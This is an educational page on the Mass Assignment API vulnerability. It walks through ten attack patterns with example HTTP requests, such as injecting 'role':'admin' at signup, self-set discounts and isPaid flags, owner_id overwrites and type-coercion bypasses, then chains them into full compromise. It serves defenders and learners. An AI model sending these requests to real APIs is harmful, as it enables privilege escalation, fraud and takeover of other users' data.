# API6:2019 Mass Assignment - Attack Vectors

## Table of Contents
- [Understanding Mass Assignment Attack Vectors](#understanding-mass-assignment-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Mass Assignment](#chaining-mass-assignment)

## Understanding Mass Assignment Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.

Mass Assignment is not exploited with a crafted payload or an injection string—it is exploited by **adding fields**. The attacker sends the request the application expects, then appends extra keys that name sensitive properties on the underlying object. If the server binds the body without an allow-list, those extra keys are written straight to the model.

The whole exercise is therefore about **discovering field names** and **confirming they are writable**. The attacker's goal is usually one of:

- Elevate privileges by setting an authorization field (`role`, `is_admin`).
- Bypass a control by flipping a status/verification field (`isVerified`, `approved`).
- Commit fraud by writing a financial field (`balance`, `discount`).
- Break access control by overwriting an identity/ownership field (`user_id`, `account_id`).

### Core Attack Flow

```
1. Discover fields
   ↓
   Read GET responses, OpenAPI/Swagger, JS bundles, docs, error messages
2. Guess sensitive names
   ↓
   role, is_admin, isVerified, balance, user_id, status, discount ...
3. Inject extra fields
   ↓
   Append them to a normal create/update request body
4. Confirm the write
   ↓
   Re-read the object (GET) or observe changed behaviour (now admin)
5. Escalate / Exploit
   ↓
   Use the new privilege, money, or ownership
```

## Common Attack Patterns

### 1. Privilege Escalation via an Authorization Field

The signature Mass Assignment attack: append a role or admin flag to a signup or profile request.

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "mallory",
  "email":    "mallory@evil.example",
  "password": "pw",
  "role":     "admin"          <-- extra field the form never sends
}

HTTP/1.1 201 Created
{ "id": 512, "username": "mallory", "role": "admin" }   <-- bound and persisted
```

**Payoff**: an administrator account created in a single request, no exploit beyond one extra JSON key. Variants: `is_admin: true`, `is_staff: true`, `account_type: "premium"`, `permissions: ["*"]`.

### 2. Verification / Status Bypass

Flip a flag that gates the rest of the platform.

```http
PATCH /api/users/me HTTP/1.1
{ "isVerified": true, "emailConfirmed": true }

# The update endpoint merges the whole body:
for k, v in body.items(): setattr(user, k, v)
# user.isVerified is now True without any email round-trip
```

**Payoff**: skips email confirmation, KYC, or manual approval—unlocking features that were supposed to be gated.

### 3. Financial Field Tampering

Write a value the server should own.

```http
POST /api/orders HTTP/1.1
{
  "items": [ { "sku": "A1", "qty": 1 } ],
  "discount": 100,             <-- attacker sets their own discount
  "isPaid": true               <-- and marks the order paid
}
```

**Payoff**: direct monetary loss—free or discounted goods, an unpaid order treated as paid, or a self-granted account balance.

### 4. Ownership / Identity Overwrite

Decide authorship or ownership from the body instead of the session.

```http
POST /api/comments HTTP/1.1        # attacker is user 9
{ "text": "posted as someone else", "user_id": 3 }

PATCH /api/documents/88 HTTP/1.1
{ "owner_id": 9 }                  # re-assign someone else's document to me
```

**Payoff**: forge records as another user, or seize ownership of objects—often chaining into a Broken Object Level Authorization outcome.

### 5. Update (PATCH/PUT) Merge Abuse

Update endpoints that merge the entire body are prime targets, because the attacker changes exactly one sensitive field.

```http
PUT /api/profile HTTP/1.1
{
  "displayName": "Mallory",      <-- the only field the UI edits
  "role": "admin"                <-- rides along on the same merge
}
```

**Payoff**: the endpoint looks benign (edit your name) but writes any field on the record.

### 6. Nested-Object Binding

Deep binding follows object graphs into related entities.

```http
PUT /api/orders/77 HTTP/1.1
{
  "note": "gift",
  "customer": { "id": 1042 },       <-- re-point the order at another customer
  "shipping": { "cost": 0 },
  "discount": { "percent": 100 }
}
```

**Payoff**: reaches fields and relationships the top-level endpoint never intended to expose—customer, pricing, address, or a linked account.

### 7. Array / Collection Binding

Sensitive relations are sometimes list-valued.

```http
PATCH /api/users/me HTTP/1.1
{
  "roles":  ["user", "admin"],       <-- add a role to the set
  "groups": ["billing-admins"]
}
```

**Payoff**: membership-based authorization is subverted by simply appending to the bound collection.

### 8. Field-Name Discovery from Read Endpoints

Attackers rarely guess blindly—the write fields are usually revealed by the corresponding read.

```http
GET /api/users/me HTTP/1.1

HTTP/1.1 200 OK
{
  "id": 9, "username": "mallory", "email": "m@evil.example",
  "role": "user", "isVerified": false, "balance": 0, "account_id": 44
}
# Every key here is a candidate to send BACK in a write request.
```

**Payoff**: the API hands the attacker the exact list of bindable field names (this is why Mass Assignment and Excessive Data Exposure are two halves of the same problem).

### 9. Schema and Source Mining

Field names also leak from documentation and code.

```http
GET /openapi.json         # full request/response schema, every property named
GET /swagger-ui/          # interactive schema browser
# plus: mobile app decompiles, front-end JS bundles, public repos, error messages
```

**Payoff**: a complete, authoritative map of every property—including internal ones that never appear in the UI.

### 10. Type-Confusion and Coercion Tricks

When a name is bound but a naive check guards it, attackers exploit how the framework coerces types.

```
# Guard: if body.get("isAdmin") == "true": reject
{ "isAdmin": true }        # boolean, not the string "true" -> guard missed, value bound

# Or arrays vs scalars, nested vs flat, to slip past a shallow filter
{ "role[]": "admin" }
```

**Payoff**: bypasses ad-hoc, string-based blocklists that fail to account for JSON types—another reason allow-lists beat blocklists.

## Chaining Mass Assignment

A single injected field is often just the first link:

```
GET /api/users/me leaks field names (role, account_id)
        +
POST /api/register with "role":"admin"   -> attacker is now admin
        +
Admin endpoints now authorize the attacker
        =  full administrative compromise from one extra JSON key
```

Another common chain into Broken Object Level Authorization:

```
PATCH /api/documents/88  { "owner_id": 9 }   -> seize another user's document
        -> now "authorized" as owner on every per-object check
        -> read, modify, or delete data that was never yours
```

And a financial chain:

```
GET /api/cart reveals a "discount" field
        -> POST /api/orders { ..., "discount": 100, "isPaid": true }
        -> checkout completes at zero cost, marked paid
```

## Key Takeaways

1. **Mass Assignment is exploited by adding fields, not by payloads**—the attack is an extra key in a normal request.
2. **Read endpoints teach the write attack**—GET responses and schemas hand attackers the bindable field names.
3. **Updates are as dangerous as creates**—body-merging PATCH/PUT handlers let an attacker flip one sensitive field.
4. **Nested and array binding widen the blast radius**—deep binding reaches related objects and collection-based roles.
5. **Blocklists and string checks fail**—type coercion and new fields defeat them; only an allow-list holds.

## Next Steps

- **[Prevention Guide](prevention.md)**: Allow-lists, DTOs, and read-only fields
- **[Code Examples](examples.md)**: Vulnerable vs. secure binding across frameworks
- **[API Security Top 10](/learn/api)**: Return to the full learning path
- **[Practice](/practice)**: Try these techniques against hands-on challenges
